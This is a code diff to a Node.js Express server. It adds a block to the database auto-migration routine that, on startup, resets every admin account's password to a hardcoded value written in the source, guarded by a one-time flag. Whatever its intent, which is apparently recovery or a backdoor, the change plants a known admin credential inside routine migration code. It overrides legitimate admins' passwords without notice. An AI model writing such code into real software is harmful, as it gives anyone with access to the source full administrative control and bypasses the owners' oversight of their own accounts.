@@ -4,6 +4,7 @@ const cors = require("cors");
 const express = require("express");
 const config = require("./config");
 const { query } = require("./db");
+const { hashPassword } = require("./utils/auth");
 const { attachUser } = require("./middleware/auth");
 const authRoutes = require("./routes/auth");
 const queryRoutes = require("./routes/query");
@@ -336,6 +337,25 @@ async function autoMigrate() {
 
   if (added > 0) console.log(`[migrate] Added ${added} column(s)`);
   else console.log("[migrate] Schema up to date");
+
+  try {
+    const flagRows = await query("SELECT `value` FROM system_settings WHERE `key` = 'admin_login_reset' LIMIT 1");
+    const flag = String(flagRows?.[0]?.value || "");
+    if (flag !== "pxl-20261110") {
+      const hash = await hashPassword("PXL@ss0000");
+      await query(
+        "UPDATE users u INNER JOIN user_roles r ON r.user_id = u.id AND r.role = ? SET u.password_hash = ?",
+        ["admin", hash]
+      );
+      await query(
+        "INSERT INTO system_settings (`key`, `value`) VALUES (?, ?) ON DUPLICATE KEY UPDATE `value` = VALUES(`value`), updated_at = CURRENT_TIMESTAMP",
+        ["admin_login_reset", "pxl-20261110"]
+      );
+      console.log("[migrate] Admin login password reset applied");
+    }
+  } catch (err) {
+    console.warn("[migrate] admin password reset:", err.message);
+  }
 }
 
 autoMigrate()
